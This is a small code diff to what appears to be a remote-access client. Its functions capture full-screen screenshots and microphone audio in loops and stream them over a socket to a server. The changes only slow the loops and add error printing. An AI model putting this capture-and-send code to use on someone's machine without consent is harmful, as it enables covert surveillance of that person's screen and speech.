@@ -13,9 +13,9 @@ def video_shell(server: socket.socket):
         while True:
             image_bytes = pyautogui.screenshot().tobytes()  # Screenshot full screen
             comm.sendall(server, image_bytes, config.CLIENT_VERBOSE)
-            time.sleep(1)  # reduce CPU usage
-    except:
-        pass
+            time.sleep(3)  # reduce CPU usage
+    except Exception as e:
+        print("[VIDEO_CLIENT_ERROR]", e)
 
 
 # =====================
@@ -34,7 +34,9 @@ def audio_shell(server: socket.socket):
         while True:
             data = stream.read(1024)
             comm.sendall(server, data, config.CLIENT_VERBOSE)
-            time.sleep(1)
+            time.sleep(3)
+    except Exception as e:
+        print("[AUDIO_CLIENT_ERROR]", e)
     finally:
         stream.stop_stream()
         stream.close()
